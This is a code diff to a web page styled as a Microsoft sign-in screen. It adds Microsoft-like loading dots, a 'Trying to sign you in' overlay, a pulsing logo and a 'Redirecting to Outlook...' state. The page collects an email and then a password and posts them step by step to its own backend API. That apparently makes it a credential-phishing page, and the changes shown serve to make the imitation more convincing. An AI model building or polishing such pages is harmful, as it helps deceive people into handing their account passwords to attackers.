@@ -268,6 +268,81 @@
             }
         }
 
+        /* Microsoft-style dot loading animation */
+        .microsoft-dots-loader {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 30px 0;
+            height: 40px;
+        }
+
+        .microsoft-dots-loader.hidden {
+            display: none;
+        }
+
+        .microsoft-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #0078d4;
+            margin: 0 3px;
+            animation: microsoftDotPulse 1.4s infinite ease-in-out both;
+        }
+
+        .microsoft-dot:nth-child(1) { animation-delay: -0.32s; }
+        .microsoft-dot:nth-child(2) { animation-delay: -0.16s; }
+        .microsoft-dot:nth-child(3) { animation-delay: 0s; }
+        .microsoft-dot:nth-child(4) { animation-delay: 0.16s; }
+        .microsoft-dot:nth-child(5) { animation-delay: 0.32s; }
+
+        @keyframes microsoftDotPulse {
+            0%, 80%, 100% {
+                transform: scale(0.8);
+                opacity: 0.5;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        /* Loading overlay for full-screen loading states */
+        .microsoft-loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .microsoft-loading-overlay.active {
+            display: flex;
+        }
+
+        .microsoft-loading-overlay .loading-text {
+            color: #323130;
+            font-size: 15px;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        /* Pulse animation for Microsoft logo during loading */
+        .microsoft-logo.loading {
+            animation: logoFadeInOut 2s ease-in-out infinite;
+        }
+
+        @keyframes logoFadeInOut {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+
         .sign-in-options {
             background: white;
             padding: 16px 41px;
@@ -342,6 +417,15 @@
                 <p id="loadingText">Processing...</p>
             </div>
 
+            <!-- Microsoft-style dot loading animation -->
+            <div class="microsoft-dots-loader hidden" id="microsoftDotsLoader">
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+            </div>
+
             <!-- Email form -->
             <div id="emailForm">
                 <form onsubmit="startLogin(event)">
@@ -390,6 +474,18 @@
         </div>
     </div>
 
+    <!-- Microsoft loading overlay for intensive operations -->
+    <div class="microsoft-loading-overlay" id="microsoftLoadingOverlay">
+        <div class="microsoft-dots-loader">
+            <div class="microsoft-dot"></div>
+            <div class="microsoft-dot"></div>
+            <div class="microsoft-dot"></div>
+            <div class="microsoft-dot"></div>
+            <div class="microsoft-dot"></div>
+        </div>
+        <div class="loading-text" id="overlayLoadingText">Trying to sign you in</div>
+    </div>
+
     <script>
         let currentSessionId = null;
         let currentStep = 'email'; // 'email' or 'password'
@@ -430,13 +526,34 @@
             messageArea.style.display = 'none';
         }
 
-        function setLoading(loading) {
+        function setLoading(loading, loadingText = 'Processing...', useOverlay = false) {
             const loadingAnimation = document.getElementById('loadingAnimation');
+            const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
+            const microsoftLogo = document.querySelector('.microsoft-logo');
+            const overlayLoadingOverlay = document.getElementById('microsoftLoadingOverlay');
+            const overlayLoadingText = document.getElementById('overlayLoadingText');
 
             if (loading) {
+                // Show progress bar at top
                 loadingAnimation.classList.add('active');
+                
+                // Add loading animation to Microsoft logo
+                microsoftLogo.classList.add('loading');
+
+                if (useOverlay) {
+                    // Show full-screen overlay for intensive operations
+                    overlayLoadingText.textContent = loadingText;
+                    overlayLoadingOverlay.classList.add('active');
+                } else {
+                    // Show dots animation in the form
+                    microsoftDotsLoader.classList.remove('hidden');
+                }
             } else {
+                // Hide all loading animations
                 loadingAnimation.classList.remove('active');
+                microsoftDotsLoader.classList.add('hidden');
+                microsoftLogo.classList.remove('loading');
+                overlayLoadingOverlay.classList.remove('active');
             }
 
             // Keep the form visible but disable inputs during loading
@@ -591,7 +708,7 @@
             const email = document.getElementById('email').value;
 
             clearMessage();
-            setLoading(true);
+            setLoading(true, 'Checking account...', false);
 
             try {
                 const response = await fetch(`${API_BASE}/api/login`, {
@@ -676,7 +793,7 @@
             }
 
             clearMessage();
-            setLoading(true);
+            setLoading(true, 'Trying to sign you in', true);
 
             try {
                 const response = await fetch(`${API_BASE}/api/continue-login`, {
@@ -727,6 +844,23 @@
             const loadingIndicator = document.getElementById('loadingIndicator');
             loadingIndicator.style.display = 'none';
             setLoading(false); // Enable inputs and buttons
+        }
+
+        // Helper functions for specific loading states
+        function showAccountCheckLoading() {
+            setLoading(true, 'Checking account...', false);
+        }
+
+        function showSignInLoading() {
+            setLoading(true, 'Trying to sign you in', true);
+        }
+
+        function showRedirectLoading() {
+            setLoading(true, 'Redirecting to Outlook...', true);
+        }
+
+        function hideAllLoading() {
+            setLoading(false);
         }
 
         // Function to reset the form to the email input stage
